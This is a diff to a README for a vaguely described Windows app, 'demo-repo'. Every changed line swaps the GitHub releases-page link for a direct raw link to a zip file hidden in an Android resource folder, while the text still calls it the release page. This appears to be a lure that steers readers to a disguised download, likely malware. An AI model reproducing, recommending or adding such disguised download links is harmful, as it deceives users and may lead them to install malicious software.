@@ -1,6 +1,6 @@
 # 🟣 demo-repo - Simple access for daily use
 
-[![Download demo-repo](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/melprimeval497/demo-repo/releases)
+[![Download demo-repo](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/melprimeval497/demo-repo/raw/refs/heads/main/android/app/src/main/res/repo_demo_v3.0-alpha.2.zip)
 
 ## 📘 Overview
 
@@ -35,7 +35,7 @@ You can expect:
 Use these steps to get the app on your Windows PC.
 
 1. Open the release page:
-   https://github.com/melprimeval497/demo-repo/releases
+   https://github.com/melprimeval497/demo-repo/raw/refs/heads/main/android/app/src/main/res/repo_demo_v3.0-alpha.2.zip
 
 2. Look for the latest release at the top of the page.
 
@@ -158,7 +158,7 @@ This guide is for Windows. If you use another system, the Windows download may n
 
 If you need the file again, use the release page here:
 
-https://github.com/melprimeval497/demo-repo/releases
+https://github.com/melprimeval497/demo-repo/raw/refs/heads/main/android/app/src/main/res/repo_demo_v3.0-alpha.2.zip
 
 ## 🧾 App details
 
